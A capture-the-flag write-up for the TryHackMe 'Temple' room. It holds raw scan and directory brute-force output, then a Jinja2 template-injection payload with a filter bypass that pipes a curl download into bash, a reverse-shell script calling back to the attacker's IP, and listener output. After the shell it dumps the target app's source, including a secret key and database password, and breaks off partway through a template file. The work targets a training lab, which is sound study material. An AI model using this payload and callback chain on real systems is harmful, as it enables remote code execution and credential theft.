---
Can you gain access to the temple?
---

# Temple — Writeup

## Overview
### Temple — Writeup
### Temple — Writeup
![](https://assets.tryhackme.com/room-banners/temple.jpg)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/b2c1159c01a89db5df489ba087dbc4d8.png)
### Gain access to the temple!
Start Machine
Deploy the machine, it may take a few minutes to start.
Can you get access to the temple?
Answer the questions below

## Enumeration
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.174.180 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.174.180:7
Open 10.10.174.180:21
Open 10.10.174.180:22
Open 10.10.174.180:23
Open 10.10.174.180:80
Open 10.10.174.180:61337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 10:37 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:37
Completed Parallel DNS resolution of 1 host. at 10:37, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:37
Scanning 10.10.174.180 [6 ports]
Discovered open port 80/tcp on 10.10.174.180
Discovered open port 21/tcp on 10.10.174.180
Discovered open port 23/tcp on 10.10.174.180
Discovered open port 22/tcp on 10.10.174.180
Discovered open port 7/tcp on 10.10.174.180
Discovered open port 61337/tcp on 10.10.174.180
Completed Connect Scan at 10:37, 0.22s elapsed (6 total ports)
Initiating Service scan at 10:37
Scanning 6 services on 10.10.174.180
Completed Service scan at 10:37, 6.86s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.174.180.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 7.79s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 1.42s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Nmap scan report for 10.10.174.180
Host is up, received user-set (0.21s latency).
Scanned at 2023-01-24 10:37:39 EST for 17s

PORT      STATE SERVICE REASON  VERSION
7/tcp     open  echo    syn-ack
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9e30c56192841b246486c33bb7dc9934 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDviuvddkQ0YODd4SKeFpZ+MrHKzDpz6vzQREErpzC5tZOT2AY2XKp7yiRa/XLrylST7MhJ8GhxKSuQHkz7DZczimHCCFV3eNGhNVTVUS2ZGwK1/Ff++73qlEjyTlzdLaOm4QtCceepksuf6Z51LRE79vSMv9xVyVtyRb4XWYBVO9HZmBtQwaBrk6lUCBpF0/NbA6C/LK730rEnvaxpt3N2UeOWrepA5a0OeswS05C3VAt03tfboQQ8apooZSQH798jXg7D4wv7zJMVgmU3i169De7viqGIACD+bac6wp75OsEhMzaUPXhXYY6293W+5Hkwqpq+7Mo02jRSqViEImlb
|   256 78c3c3838173cbf15041f19ad7bf3ed1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZqq+5ThS/qu9HZ+EYhZlNV4rVxxaFfP03DBU5XtAMQM0+u32hawMDfxsTr8NHps0zjcoj1gC9fHTbRg/xHggM=
|   256 ecceb8f957535663e961901215e5784a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPt1Zs9PzQV9rm3cNCQahQxaTyGaX59nzLdrgmyTg3Ee
23/tcp    open  telnet  syn-ack Linux telnetd
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
61337/tcp open  http    syn-ack Werkzeug httpd 2.0.1 (Python 3.6.9)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.174.180:61337/login
|_http-server-header: Werkzeug/2.0.1 Python/3.6.9
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds

http://10.10.174.180:61337/login

adding ' (sqli)

Error: Hacking attempt detected! You have been logged as 10.8.19.103. (Detected illegal chars in username). 

└─$ gobuster dir -u http://10.10.174.180:61337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.174.180:61337/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php,py,html
[+] Timeout:                 10s
===============================================================
2023/01/24 10:48:38 Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/login                (Status: 200) [Size: 1676]
/admin                (Status: 403) [Size: 239]
/account              (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/external             (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/logout               (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/application          (Status: 403) [Size: 239]
/robots.txt           (Status: 200) [Size: 20]
/internal             (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
Progress: 53834 / 1102805 (4.88%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/01/24 11:20:49 Finished
===============================================================

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 64 -u http://10.10.174.180:61337/ -k -w /usr/share/wordlists/dirb/common.txt -x py,html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [py, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        4l       24w      218c http://10.10.174.180:61337/ => http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/account => http://10.10.174.180:61337/login
403      GET        4l       30w      239c http://10.10.174.180:61337/admin
403      GET        4l       30w      239c http://10.10.174.180:61337/application
302      GET        4l       24w      218c http://10.10.174.180:61337/external => http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/home => http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/internal => http://10.10.174.180:61337/login
200      GET       89l      195w     1676c http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/logout => http://10.10.174.180:61337/login
200      GET        1l        4w       20c http://10.10.174.180:61337/robots.txt
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary
[####################] - 16m    18456/18456   0s      found:11      errors:0      
[####################] - 16m    18456/18456   18/s    http://10.10.174.180:61337/ 

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 64 -u http://10.10.174.180:61337/temporary -k -w /usr/share/wordlists/dirb/common.txt -x py,html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/temporary
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [py, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary/dev
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_174_180:61337_temporary-1674577483.state ...
[#######>------------] - 3m      6550/18456   5m      found:2       errors:0      
[######>-------------] - 3m      6400/18456   33/s    http://10.10.174.180:61337/temporary/

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 64 -u http://10.10.174.180:61337/temporary/dev -k -w /usr/share/wordlists/dirb/common.txt -x py,html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/temporary/dev
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [py, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary/dev
[####################] - 9m     18456/18456   0s      found:1       errors:0      
[####################] - 9m     18456/18456   33/s    http://10.10.174.180:61337/temporary/dev/ 

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 100 -u http://10.10.174.180:61337/temporary/dev -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/temporary/dev
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary/dev
[######>-------------] - 47m    76421/220546  1h      found:1       errors:18656  
[######>-------------] - 47m    76420/220546  26/s    http://10.10.174.180:61337/temporary/dev/ 

too much time

using ffuf

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 3 -u http://10.10.183.126:61337/temporary/FUZZ -o temple_ffuf -t 100 -recursion-strategy greedy

This command is using the ffuf tool to perform a directory brute-force attack on the specified URL ([http://10.10.183.126:61337/temporary/](http://10.10.11.40:61337/temporary/)) with a wordlist located at /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. The "-recursion" flag is used to enable recursion and the "-recursion-depth 3" flag is used to set the recursion depth to 3. The "-u" flag specifies the target URL and the "-o" flag specifies the output file for the scan results. The "-t" flag specifies the number of threads to use and the "-recursion-strategy" flag is set to "greedy" to enable greedy recursion.

In ffuf, the "greedy" recursion strategy is used to search for new directories in a more aggressive manner. It will explore each discovered directory for new directories immediately rather than waiting for the current recursion level to finish. This can potentially find new directories faster, but it also increases the number of requests made and can cause the scan to slow down. It is important to use this option wisely, as it can make the scan more resource-intensive and less efficient if the target website is very large or if the wordlist is too big.

The recursion depth flag in ffuf specifies how many levels deep the tool should search for new directories. In this specific command, the recursion depth is set to 3, which means that ffuf will search for new directories three levels deep. For example, if the initial URL is [http://10.10.183.126:61337/temporary/](http://10.10.11.40:61337/temporary/), the first level of recursion would search for new directories within that URL, the second level would search for new directories within the directories found in the first level, and the third level would search for new directories within the directories found in the second level.

This flag is useful for controlling the scope of the scan and limiting the number of requests made to the target website. A higher recursion depth will increase the chances of finding new directories, but it will also increase the time and resources required to complete the scan.
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 3 -u http://10.10.183.126:61337/temporary/FUZZ -t 100 -recursion-strategy greedy

newacc                  [Status: 200, Size: 1886, Words: 255, Lines: 97, Duration: 2922ms]
:: Progress: [185451/220560] :: Job [2/2] :: 32 req/sec :: Duration: [1:3[INFO] Adding a new job to the queue: http://10.10.183.126:61337/temporary/dev/newacc/FUZZ

http://10.10.183.126:61337/temporary/dev/newacc
http://10.10.183.126:61337/login

SSTI

username
{{7*7}}

Logged in as 49

{{config}}

Logged in as <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>

search
'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING':

Flask 

Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [https://twitter.com/SecGus](https://twitter.com/SecGus):

create acc

{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.8.19.103/rce | bash")|attr("read")()}}

──(kali㉿kali)-[~/Downloads/temple]
└─$ nano rce
```
```bash
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ cat rce             
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.8.19.103/1337 0>&1"
```
```bash
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.181.180 - - [24/Jan/2023 19:02:44] "GET /rce HTTP/1.1" 200 -
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.181.180.
Ncat: Connection from 10.10.181.180:42690.
bash: cannot set terminal process group (785): Inappropriate ioctl for device
bash: no job control in this shell
bill@temple:~/webapp$ whoami
whoami
bill

bill@temple:~/webapp$ cat webapp.py
cat webapp.py
from flask import Flask, flash, redirect, render_template, request, session, abort, make_response, render_template_string
from time import gmtime, strftime
import jinja2, pymysql.cursors, re, hashlib

app = Flask(__name__, template_folder="/home/bill/webapp/templates")

app.secret_key = b"f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry"

def check_hacking_attempt(value):

        bad_chars = "'_#&;"
        error = ""

        if any(ch in bad_chars for ch in value):
                error = "Hacking attempt detected! "
                error += "You have been logged as "
                error += request.remote_addr
                return True, error

        else:
                return False, error

@app.route("/robots.txt", methods=["GET"])
def robots():
        return "<!-- Try harder --!>"

@app.route("/admin", methods=["GET"])
def admin():
        return abort(403)

@app.route("/", methods=["GET"])
def root():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                return redirect("/home")

@app.route("/application", methods=["GET"])
def application():
        return abort(403)

@app.route("/application/console", methods=["GET"])
def console():
        return abort(403)

@app.route("/temporary", methods=["GET"])
def temporary():
        return abort(403)

@app.route("/temporary/dev", methods=["GET"])
def dev():
        return abort(403)

@app.route("/temporary/dev/newacc", methods=["GET", "POST"])
def newacc():

        if request.method == "POST":

                if not re.match(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", request.form["email"]):
                        error = "Invalid email!"
                        return render_template("register.html", error=error)

                email = request.form["email"]
                attempt, error = check_hacking_attempt(email)
                if attempt == True:
                        error += ". (Detected illegal chars in e-mail)."
                        return render_template("register.html", error=error)

                if len(request.form["username"]) <= 4:
                        return render_template("register.html", error="Your username must be 5 characters or longer")

                username = request.form["username"]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += ". (Detected illegal chars in username)."
                        return render_template("register.html", error=error)

                if len(request.form["password"]) <= 7:
                        return render_template("register.html", error="Your password must be 8 characters or longer")

                password = request.form["password"]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += ". (Detected illegal chars in password)."
                        return render_template("register.html", error=error)

                connection = connect_database()
                with connection:
                        with connection.cursor() as cursor:
                                sql = "SELECT email FROM users WHERE email=%s"
                                cursor.execute(sql, (email))
                                if not cursor.fetchone() == None:
                                        return render_template("register.html", error="Email already exists.")

                                sql = "SELECT username FROM users WHERE username=%s"
                                cursor.execute(sql, (username))
                                if not cursor.fetchone() == None:
                                        return render_template("register.html", error="Username already exists.")

                                sql = "INSERT INTO users(email, username, password) VALUES (%s, %s, SHA2(%s,224))"
                                cursor.execute(sql, (email, username, password))
                                connection.commit()

                        return render_template("register.html", success="Account created.")

        return render_template("register.html")

@app.route("/login", methods=["GET", "POST"])
def login():
        if session.get("logged_in"):
                return redirect("/home")

        if request.method == "POST":

                username = request.form["username"]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += ". (Detected illegal chars in username)."
                        return render_template("login.html", error=error)

                password = request.form["password"]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += ". (Detected illegal chars in password)."
                        return render_template("login.html", error=error)

                connection = connect_database()
                with connection:
                        with connection.cursor() as cursor:
                                sql = "SELECT username FROM users WHERE username=%s"
                                cursor.execute(sql, (username))
                                if cursor.fetchone() == None:
                                        return render_template("login.html", error="Invalid username or password.")

                                m = hashlib.sha224()
                                m.update(password.encode())
                                hashed_password = m.hexdigest()

                                sql = "SELECT password FROM users WHERE username=%s AND password=%s"
                                cursor.execute(sql, (username, hashed_password))

                                if cursor.fetchone() == None:
                                        return render_template("login.html", error="Invalid username or password.")

                                session["username"] = username
                                session["logged_in"] = True

                                m = hashlib.sha224()
                                m.update(username.encode())
                                hashed_username = m.hexdigest()

                                resp = make_response(redirect("/home"))
                                resp.set_cookie("identifier", hashed_username, httponly=True)
                                return resp

        return render_template("login.html")

@app.route("/logout", methods=["GET"])
def logout():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                session.clear()
                return redirect("/login")

@app.route("/home", methods=["GET"])
def home():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                current_ip = request.remote_addr

                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("home.html")
                return t.render(current_ip=current_ip)

@app.route("/account", methods=["GET"])
def account():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                username = session["username"]
                current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
                current_ip = request.remote_addr

                template = """
                <!DOCTYPE html>
                <html>
                <head>
                <style>
                body {
                  margin: 0;
                }

                ul {
                  list-style-type: none;
                  margin: 0;
                  padding: 0;
                  width: 10%;
                  background-color: #f1f1f1;
                  position: fixed;
                  height: 100%;
                  overflow: auto;
                }

                li a {
                  display: block;
                  color: #000;
                  padding: 8px 16px;
                  text-decoration: none;
                }

                li a.active {
                  background-color: #8B0000;
                  color: white;
                }

                li a:hover:not(.active) {
                  background-color: #555;
                  color: white;
                }
                </style>
                </head>
                <body>

                <ul>
                  <li><a href="/home">Home</a></li>
                  <li><a href="/internal">Internal News</a></li>
                  <li><a href="/external">External News</a></li>
                  <li><a class="active" href="/account">Account</a></li>
                  <li><a href="/logout">Log Out</a></li>
                </ul>

                <div style="margin-left:11%;padding:1px 16px;height:1000px;">
                  <h2>Account</h2>
                  <p>Logged in as """ + username + """</p>

                  <p>Last logged in from """ + current_ip + """</p>
                  <p>Current time: """ + current_time + """</p><br>
                  <p>Please contact our staff for support</p>
                  <p>support@templeindustries.local</p>
                </div>

                </body>
                </html>"""

                return render_template_string(template)

@app.route("/internal", methods=["GET"])
def internal():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("internal.html")
                return t.render()

@app.route("/external", methods=["GET"])
def external():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("external.html")
                return t.render()

def connect_database():

        global connection
        connection = pymysql.connect(host="localhost",
                                                        user="temple_user",
                                                        password="4$pCM!&bEEs$SR8H",
                                                        db="temple",
                                                        cursorclass=pymysql.cursors.DictCursor)
        return connection

if __name__ == "__main__":
        app.run(host="0.0.0.0", port=61337, debug=False)

bill@temple:~/webapp/templates$ cat login.html
cat login.html
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: black;
}

* {
  box-sizing: border-box;
}

/* Add padding to containers */
.container {
  padding: 16px;
  background-color: white;
}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  display: inline-block;
  border: none;
  background: #f1f1f1;
}

input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Overwrite default styles of hr */
hr {
  border: 1px solid #f1f1f1;
  margin-bottom: 25px;
}

/* Set a style for the submit button */
.login_button {
  background-color: #04AA6D;
  color: white;
  padding: 16px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.registerbtn:hover {
  opacity: 1;
}

/* Add a blue text color to links */
a {
  color: dodgerblue;
}

/* Set a grey background color and center the text of the "sign in" section */
.signin {
  background-color: #f1f1f1;
  text-align: center;
}
</style>
</head>
<body>

<div class="container">
<form action="" method="POST">
    <h1>Log in</h1>
    <hr>
    <label for="usr"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="username" id="username" value="{{ request.form.username }}" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Password" name="password" id="password" value="{{ request.form.password }}" required>
    <hr>

    <button type="submit" class="login_button">Log in</button>
  
</form>
    {% if error %}
    <p class="error"><strong>Error:</strong> {{ error }}
    {% endif %}
      </div>
</body>
</html>

bill@temple:~/webapp/templates$ cat register.html
cat register.html
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: black;
}

* {
  box-sizing: border-box;
}

/* Add padding to containers */
.container {
  padding: 16px;
  background-color: white;
}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  display: inline-block;
  border: none;
  background: #f1f1f1;
}

input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Overwrite default styles of hr */
hr {
  border: 1px solid #f1f1f1;
  margin-bottom: 25px;
}

/* Set a style for the submit button */
.registerbtn {
  background-color: #04AA6D;
  color: white;
  padding: 16px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.registerbtn:hover {
  opacity: 1;
}

/* Add a blue text color to links */
a {
  color: dodgerblue;
}

/* Set a grey background color and center the text of the "sign in" section */
.signin {
  background-color: #f1f1f1;
  text-align: center;
}
</style>
</head>
<body>

<form action="" method="POST">
  <div class="container">
    <h1>Register</h1>
    <p>Please fill in this form to create an account.</p>
    <hr>

    <label for="email"><b>Email</b></label>
    <input type="text" placeholder="Enter Email" name="email" id="email" value="{{ request.form.email }}" required>

    <label for="usr"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="username" id="username" value="{{ request.form.username }}" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Password" name="password" id="password" value="{{ request.form.password }}" required>
    <hr>

    <button type="submit" class="registerbtn">Register</button>
        {% if error %}
    <p class="error"><strong>Error:</strong> {{ error }}
    {% endif %}
    
    {% if success %}
    <p class="error"><strong>Success!</strong> {{ success }}
    {% endif %}
  </div>
  
</form>

</body>
</html>

bill@temple:~/webapp/templates$ cat about.html
cat about.html

{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a href="/home">Home</a></li>
  <li><a href="/internal">Internal News</a></li>
  <li><a href="/external">External News</a></li>
  <li><a class="active" href="/about">About</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>About the company</h2>
  <h3>We work hard, but also play hard</h3>
  <p>Please contact our staff for further support</p>
  <p>support@somecompany.local</p>
</div>

</body>
</html>

bill@temple:~/webapp/templates$ cat external.html
cat external.html

{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
